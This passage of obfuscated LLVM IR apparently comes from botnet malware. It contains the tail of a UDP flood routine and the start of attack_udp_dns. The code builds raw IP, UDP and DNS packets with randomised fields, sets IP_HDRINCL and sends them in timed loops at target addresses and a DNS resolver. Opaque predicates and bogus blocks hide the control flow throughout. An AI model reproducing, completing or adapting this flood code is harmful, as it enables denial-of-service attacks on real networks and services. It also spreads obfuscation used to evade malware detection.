  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBBpart297, label %originalBB91alteredBB

originalBBpart297:                                ; preds = %originalBB91
  br label %269

; <label>:471:                                    ; preds = %269
  %472 = call i64 @time(i64* null) #6
  %473 = load i32, i32* %22, align 4
  %474 = sext i32 %473 to i64
  %475 = icmp sgt i64 %472, %474
  br i1 %475, label %476, label %477

; <label>:476:                                    ; preds = %471
  br label %478

; <label>:477:                                    ; preds = %471
  br label %252

; <label>:478:                                    ; preds = %476, %88, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %66
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %91
  store i32 0, i32* %11, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %113
  %479 = call noalias i8* @calloc(i64 128, i64 1) #6
  %480 = load i8**, i8*** %13, align 8
  %481 = load i32, i32* %11, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds i8*, i8** %480, i64 %482
  store i8* %479, i8** %483, align 8
  %484 = load i8**, i8*** %13, align 8
  %485 = load i32, i32* %11, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds i8*, i8** %484, i64 %486
  %488 = load i8*, i8** %487, align 8
  %489 = bitcast i8* %488 to %struct.iphdr*
  store %struct.iphdr* %489, %struct.iphdr** %23, align 8
  %490 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %491 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %490, i64 1
  %492 = bitcast %struct.iphdr* %491 to %struct.udphdr*
  store %struct.udphdr* %492, %struct.udphdr** %24, align 8
  %493 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %494 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %493, i64 1
  %495 = bitcast %struct.udphdr* %494 to i8*
  store i8* %495, i8** %25, align 8
  %496 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %497 = bitcast %struct.iphdr* %496 to i8*
  %498 = load i8, i8* %497, align 4
  %_ = sub i8 %498, 15
  %gen = mul i8 %_, 15
  %_7 = shl i8 %498, 15
  %_8 = shl i8 %498, 15
  %_9 = sub i8 %498, 15
  %gen10 = mul i8 %_9, 15
  %_11 = shl i8 %498, 15
  %_12 = sub i8 %498, 15
  %gen13 = mul i8 %_12, 15
  %_14 = sub i8 %498, 15
  %gen15 = mul i8 %_14, 15
  %499 = and i8 %498, 15
  %_16 = sub i8 0, %499
  %gen17 = add i8 %_16, 64
  %_18 = shl i8 %499, 64
  %500 = or i8 %499, 64
  store i8 %500, i8* %497, align 4
  %501 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %502 = bitcast %struct.iphdr* %501 to i8*
  %503 = load i8, i8* %502, align 4
  %_19 = sub i8 %503, -16
  %gen20 = mul i8 %_19, -16
  %_21 = sub i8 0, %503
  %gen22 = add i8 %_21, -16
  %_23 = shl i8 %503, -16
  %_24 = shl i8 %503, -16
  %_25 = sub i8 0, %503
  %gen26 = add i8 %_25, -16
  %_27 = sub i8 0, %503
  %gen28 = add i8 %_27, -16
  %504 = and i8 %503, -16
  %505 = or i8 %504, 5
  store i8 %505, i8* %502, align 4
  %506 = load i8, i8* %14, align 1
  %507 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %508 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %507, i32 0, i32 1
  store i8 %506, i8* %508, align 1
  %509 = load i32, i32* %21, align 4
  %510 = sext i32 %509 to i64
  %_29 = shl i64 32, %510
  %_30 = sub i64 32, %510
  %gen31 = mul i64 %_30, %510
  %_32 = sub i64 32, %510
  %gen33 = mul i64 %_32, %510
  %_34 = sub i64 0, 32
  %gen35 = add i64 %_34, %510
  %_36 = shl i64 32, %510
  %_37 = sub i64 32, %510
  %gen38 = mul i64 %_37, %510
  %511 = add i64 32, %510
  %512 = trunc i64 %511 to i16
  %513 = call zeroext i16 @htons(i16 zeroext %512) #7
  %514 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %515 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %514, i32 0, i32 2
  store i16 %513, i16* %515, align 2
  %516 = load i16, i16* %15, align 2
  %517 = call zeroext i16 @htons(i16 zeroext %516) #7
  %518 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %519 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %518, i32 0, i32 3
  store i16 %517, i16* %519, align 4
  %520 = load i8, i8* %16, align 1
  %521 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 5
  store i8 %520, i8* %522, align 4
  %523 = load i8, i8* %17, align 1
  %524 = icmp ne i8 %523, 0
  br label %originalBB6

originalBB42alteredBB:                            ; preds = %originalBB42, %180
  %525 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %526 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %525, i32 0, i32 6
  store i8 17, i8* %526, align 1
  %527 = load i32, i32* @LOCAL_ADDR, align 4
  %528 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 8
  store i32 %527, i32* %529, align 4
  %530 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %531 = load i32, i32* %11, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %530, i64 %532
  %534 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %533, i32 0, i32 1
  %535 = load i32, i32* %534, align 4
  %536 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %537 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %536, i32 0, i32 9
  store i32 %535, i32* %537, align 4
  %538 = load i16, i16* %18, align 2
  %539 = call zeroext i16 @htons(i16 zeroext %538) #7
  %540 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %541 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %540, i32 0, i32 0
  store i16 %539, i16* %541, align 2
  %542 = load i16, i16* %19, align 2
  %543 = call zeroext i16 @htons(i16 zeroext %542) #7
  %544 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %545 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %544, i32 0, i32 1
  store i16 %543, i16* %545, align 2
  %546 = load i32, i32* %21, align 4
  %547 = sext i32 %546 to i64
  %_43 = sub i64 0, 12
  %gen44 = add i64 %_43, %547
  %_45 = sub i64 12, %547
  %gen46 = mul i64 %_45, %547
  %_47 = shl i64 12, %547
  %_48 = sub i64 0, 12
  %gen49 = add i64 %_48, %547
  %_50 = sub i64 12, %547
  %gen51 = mul i64 %_50, %547
  %_52 = shl i64 12, %547
  %548 = add i64 12, %547
  %549 = trunc i64 %548 to i16
  %550 = call zeroext i16 @htons(i16 zeroext %549) #7
  %551 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %552 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %551, i32 0, i32 2
  store i16 %550, i16* %552, align 2
  %553 = load i8*, i8** %25, align 8
  %554 = bitcast i8* %553 to i32*
  store i32 -1, i32* %554, align 4
  %555 = load i8*, i8** %25, align 8
  %556 = getelementptr inbounds i8, i8* %555, i64 4
  store i8* %556, i8** %25, align 8
  %557 = load i8*, i8** %25, align 8
  %558 = load i8*, i8** %20, align 8
  %559 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %557, i8* %558, i32 %559)
  br label %originalBB42

originalBB56alteredBB:                            ; preds = %originalBB56, %235
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %252
  store i32 0, i32* %11, align 4
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %274
  %560 = load i8**, i8*** %13, align 8
  %561 = load i32, i32* %11, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds i8*, i8** %560, i64 %562
  %564 = load i8*, i8** %563, align 8
  store i8* %564, i8** %26, align 8
  %565 = load i8*, i8** %26, align 8
  %566 = bitcast i8* %565 to %struct.iphdr*
  store %struct.iphdr* %566, %struct.iphdr** %27, align 8
  %567 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %568 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %567, i64 1
  %569 = bitcast %struct.iphdr* %568 to %struct.udphdr*
  store %struct.udphdr* %569, %struct.udphdr** %28, align 8
  %570 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %571 = load i32, i32* %11, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %570, i64 %572
  %574 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %573, i32 0, i32 2
  %575 = load i8, i8* %574, align 4
  %576 = zext i8 %575 to i32
  %577 = icmp slt i32 %576, 32
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %330
  %578 = load i16, i16* %15, align 2
  %579 = zext i16 %578 to i32
  %580 = icmp eq i32 %579, 65535
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %368
  %581 = call i32 @rand_next()
  %582 = trunc i32 %581 to i16
  %583 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %584 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %583, i32 0, i32 1
  store i16 %582, i16* %584, align 2
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %389
  %585 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 7
  store i16 0, i16* %586, align 2
  %587 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %588 = bitcast %struct.iphdr* %587 to i16*
  %589 = call zeroext i16 @checksum_generic(i16* %588, i32 20)
  %590 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %591 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %590, i32 0, i32 7
  store i16 %589, i16* %591, align 2
  %592 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %593 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %592, i32 0, i32 3
  store i16 0, i16* %593, align 2
  %594 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %595 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %596 = bitcast %struct.udphdr* %595 to i8*
  %597 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %598 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %597, i32 0, i32 2
  %599 = load i16, i16* %598, align 2
  %600 = load i32, i32* %21, align 4
  %601 = sext i32 %600 to i64
  %_77 = shl i64 12, %601
  %_78 = sub i64 0, 12
  %gen79 = add i64 %_78, %601
  %602 = add i64 12, %601
  %603 = trunc i64 %602 to i32
  %604 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %594, i8* %596, i16 zeroext %599, i32 %603)
  %605 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %606 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %605, i32 0, i32 3
  store i16 %604, i16* %606, align 2
  %607 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %608 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %607, i32 0, i32 1
  %609 = load i16, i16* %608, align 2
  %610 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %611 = load i32, i32* %11, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %610, i64 %612
  %614 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i32 0, i32 0
  %615 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %614, i32 0, i32 1
  store i16 %609, i16* %615, align 2
  %616 = load i32, i32* %12, align 4
  %617 = load i8*, i8** %26, align 8
  %618 = load i32, i32* %21, align 4
  %619 = sext i32 %618 to i64
  %_80 = shl i64 32, %619
  %_81 = sub i64 0, 32
  %gen82 = add i64 %_81, %619
  %_83 = shl i64 32, %619
  %_84 = shl i64 32, %619
  %_85 = sub i64 0, 32
  %gen86 = add i64 %_85, %619
  %_87 = shl i64 32, %619
  %620 = add i64 32, %619
  %621 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %622 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %623 = load i32, i32* %11, align 4
  %624 = sext i32 %623 to i64
  %625 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %622, i64 %624
  %626 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %625, i32 0, i32 0
  %627 = bitcast %struct.sockaddr_in* %626 to %struct.sockaddr*
  store %struct.sockaddr* %627, %struct.sockaddr** %621, align 8
  %628 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %629 = load %struct.sockaddr*, %struct.sockaddr** %628, align 8
  %630 = call i64 @sendto(i32 %616, i8* %617, i64 %620, i32 16384, %struct.sockaddr* %629, i32 16)
  br label %originalBB76

originalBB91alteredBB:                            ; preds = %originalBB91, %452
  %631 = load i32, i32* %11, align 4
  %_92 = shl i32 %631, 1
  %_93 = shl i32 %631, 1
  %_94 = shl i32 %631, 1
  %_95 = shl i32 %631, 1
  %632 = add nsw i32 %631, 1
  store i32 %632, i32* %11, align 4
  br label %originalBB91
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.31
  %7 = load i32, i32* @y.32
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8**, align 8
  %22 = alloca i8, align 1
  %23 = alloca i16, align 2
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i16, align 2
  %27 = alloca i16, align 2
  %28 = alloca i16, align 2
  %29 = alloca i8, align 1
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8, align 1
  %36 = alloca i8, align 1
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca %struct.dnshdr*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca %struct.grehdr*, align 8
  %43 = alloca i8*, align 8
  %44 = alloca %struct.iphdr*, align 8
  %45 = alloca %struct.udphdr*, align 8
  %46 = alloca %struct.dnshdr*, align 8
  %47 = alloca i8*, align 8
  %48 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %49 = load i8, i8* %15, align 1
  %50 = zext i8 %49 to i64
  %51 = call noalias i8* @calloc(i64 %50, i64 8) #6
  %52 = bitcast i8* %51 to i8**
  store i8** %52, i8*** %21, align 8
  %53 = load i8, i8* %17, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 2, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %22, align 1
  %57 = load i8, i8* %17, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 3, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %23, align 2
  %61 = load i8, i8* %17, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 4, i32 64)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %24, align 1
  %65 = load i8, i8* %17, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 5, i32 0)
  %68 = trunc i32 %67 to i8
  store i8 %68, i8* %25, align 1
  %69 = load i8, i8* %17, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 6, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %26, align 2
  %73 = load i8, i8* %17, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 7, i32 53)
  %76 = trunc i32 %75 to i16
  store i16 %76, i16* %27, align 2
  %77 = load i8, i8* %17, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %79 = call i32 @attack_get_opt_int(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 9, i32 65535)
  %80 = trunc i32 %79 to i16
  store i16 %80, i16* %28, align 2
  %81 = load i8, i8* %17, align 1
  %82 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %83 = call i32 @attack_get_opt_int(i8 zeroext %81, %struct.attack_option* %82, i8 zeroext 0, i32 12)
  %84 = trunc i32 %83 to i8
  store i8 %84, i8* %29, align 1
  %85 = load i8, i8* %17, align 1
  %86 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %87 = call i8* @attack_get_opt_str(i8 zeroext %85, %struct.attack_option* %86, i8 zeroext 8, i8* null)
  store i8* %87, i8** %30, align 8
  store i32 0, i32* %31, align 4
  %88 = call i32 @get_dns_resolver()
  store i32 %88, i32* %32, align 4
  %89 = call i64 @time(i64* null) #6
  %90 = load i32, i32* %14, align 4
  %91 = sext i32 %90 to i64
  %92 = add nsw i64 %89, %91
  %93 = trunc i64 %92 to i32
  store i32 %93, i32* %33, align 4
  %94 = load i8*, i8** %30, align 8
  %95 = icmp eq i8* %94, null
  %96 = load i32, i32* @x.31
  %97 = load i32, i32* @y.32
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %95, label %104, label %105

; <label>:104:                                    ; preds = %originalBBpart2
  br label %574

; <label>:105:                                    ; preds = %originalBBpart2
  %106 = load i32, i32* @x.31
  %107 = load i32, i32* @y.32
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %105
  %114 = load i8*, i8** %30, align 8
  %115 = call i32 @util_strlen(i8* %114)
  store i32 %115, i32* %31, align 4
  %116 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %116, i32* %20, align 4
  %117 = icmp eq i32 %116, -1
  %118 = load i32, i32* @x.31
  %119 = load i32, i32* @y.32
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %117, label %126, label %127

; <label>:126:                                    ; preds = %originalBBpart24
  br label %574

; <label>:127:                                    ; preds = %originalBBpart24
  store i32 1, i32* %19, align 4
  %128 = load i32, i32* %20, align 4
  %129 = bitcast i32* %19 to i8*
  %130 = call i32 @setsockopt(i32 %128, i32 0, i32 3, i8* %129, i32 4) #6
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %132, label %135

; <label>:132:                                    ; preds = %127
  %133 = load i32, i32* %20, align 4
  %134 = call i32 @close(i32 %133)
  br label %574

; <label>:135:                                    ; preds = %127
  %136 = load i32, i32* @x.31
  %137 = load i32, i32* @y.32
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %135
  store i32 0, i32* %19, align 4
  %144 = load i32, i32* @x.31
  %145 = load i32, i32* @y.32
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %152

; <label>:152:                                    ; preds = %329, %originalBBpart28
  %153 = load i32, i32* %19, align 4
  %154 = load i8, i8* %15, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp slt i32 %153, %155
  br i1 %156, label %157, label %332

; <label>:157:                                    ; preds = %152
  store i32 0, i32* %34, align 4
  store i8 0, i8* %35, align 1
  store i8 0, i8* %36, align 1
  %158 = call noalias i8* @calloc(i64 600, i64 1) #6
  %159 = load i8**, i8*** %21, align 8
  %160 = load i32, i32* %19, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  store i8* %158, i8** %162, align 8
  %163 = load i8**, i8*** %21, align 8
  %164 = load i32, i32* %19, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i8*, i8** %163, i64 %165
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to %struct.iphdr*
  store %struct.iphdr* %168, %struct.iphdr** %37, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i64 1
  %171 = bitcast %struct.iphdr* %170 to %struct.udphdr*
  store %struct.udphdr* %171, %struct.udphdr** %38, align 8
  %172 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i64 1
  %174 = bitcast %struct.udphdr* %173 to %struct.dnshdr*
  store %struct.dnshdr* %174, %struct.dnshdr** %39, align 8
  %175 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %176 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %175, i64 1
  %177 = bitcast %struct.dnshdr* %176 to i8*
  store i8* %177, i8** %40, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, 15
  %182 = or i8 %181, 64
  store i8 %182, i8* %179, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %184 = bitcast %struct.iphdr* %183 to i8*
  %185 = load i8, i8* %184, align 4
  %186 = and i8 %185, -16
  %187 = or i8 %186, 5
  store i8 %187, i8* %184, align 4
  %188 = load i8, i8* %22, align 1
  %189 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 1
  store i8 %188, i8* %190, align 1
  %191 = load i8, i8* %29, align 1
  %192 = zext i8 %191 to i64
  %193 = add i64 41, %192
  %194 = add i64 %193, 2
  %195 = load i32, i32* %31, align 4
  %196 = sext i32 %195 to i64
  %197 = add i64 %194, %196
  %198 = add i64 %197, 4
  %199 = trunc i64 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 2
  store i16 %200, i16* %202, align 2
  %203 = load i16, i16* %23, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 3
  store i16 %204, i16* %206, align 4
  %207 = load i8, i8* %24, align 1
  %208 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 5
  store i8 %207, i8* %209, align 4
  %210 = load i8, i8* %25, align 1
  %211 = icmp ne i8 %210, 0
  br i1 %211, label %212, label %216

; <label>:212:                                    ; preds = %157
  %213 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 4
  store i16 %213, i16* %215, align 2
  br label %216

; <label>:216:                                    ; preds = %212, %157
  %217 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 6
  store i8 17, i8* %218, align 1
  %219 = load i32, i32* @LOCAL_ADDR, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 8
  store i32 %219, i32* %221, align 4
  %222 = load i32, i32* %32, align 4
  %223 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  store i32 %222, i32* %224, align 4
  %225 = load i16, i16* %26, align 2
  %226 = call zeroext i16 @htons(i16 zeroext %225) #7
  %227 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %228 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %227, i32 0, i32 0
  store i16 %226, i16* %228, align 2
  %229 = load i16, i16* %27, align 2
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 1
  store i16 %230, i16* %232, align 2
  %233 = load i8, i8* %29, align 1
  %234 = zext i8 %233 to i64
  %235 = add i64 21, %234
  %236 = add i64 %235, 2
  %237 = load i32, i32* %31, align 4
  %238 = sext i32 %237 to i64
  %239 = add i64 %236, %238
  %240 = add i64 %239, 4
  %241 = trunc i64 %240 to i16
  %242 = call zeroext i16 @htons(i16 zeroext %241) #7
  %243 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 2
  store i16 %242, i16* %244, align 2
  %245 = load i16, i16* %28, align 2
  %246 = call zeroext i16 @htons(i16 zeroext %245) #7
  %247 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %248 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %247, i32 0, i32 0
  store i16 %246, i16* %248, align 2
  %249 = call zeroext i16 @htons(i16 zeroext 256) #7
  %250 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %251 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %250, i32 0, i32 1
  store i16 %249, i16* %251, align 2
  %252 = call zeroext i16 @htons(i16 zeroext 1) #7
  %253 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %254 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %253, i32 0, i32 2
  store i16 %252, i16* %254, align 2
  %255 = load i8, i8* %29, align 1
  %256 = load i8*, i8** %40, align 8
  %257 = getelementptr inbounds i8, i8* %256, i32 1
  store i8* %257, i8** %40, align 8
  store i8 %255, i8* %256, align 1
  %258 = load i8, i8* %29, align 1
  %259 = zext i8 %258 to i32
  %260 = load i8*, i8** %40, align 8
  %261 = sext i32 %259 to i64
  %262 = getelementptr inbounds i8, i8* %260, i64 %261
  store i8* %262, i8** %40, align 8
  %263 = load i8*, i8** %40, align 8
  store i8* %263, i8** %41, align 8
  %264 = load i8*, i8** %40, align 8
  %265 = getelementptr inbounds i8, i8* %264, i64 1
  %266 = load i8*, i8** %30, align 8
  %267 = load i32, i32* %31, align 4
  %268 = add nsw i32 %267, 1
  call void @util_memcpy(i8* %265, i8* %266, i32 %268)
  store i32 0, i32* %34, align 4
  br label %269

; <label>:269:                                    ; preds = %311, %216
  %270 = load i32, i32* %34, align 4
  %271 = load i32, i32* %31, align 4
  %272 = icmp slt i32 %270, %271
  br i1 %272, label %273, label %314

; <label>:273:                                    ; preds = %269
  %274 = load i8*, i8** %30, align 8
  %275 = load i32, i32* %34, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds i8, i8* %274, i64 %276
  %278 = load i8, i8* %277, align 1
  %279 = sext i8 %278 to i32
  %280 = icmp eq i32 %279, 46
  br i1 %280, label %281, label %307

; <label>:281:                                    ; preds = %273
  %282 = load i32, i32* @x.31
  %283 = load i32, i32* @y.32
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %281
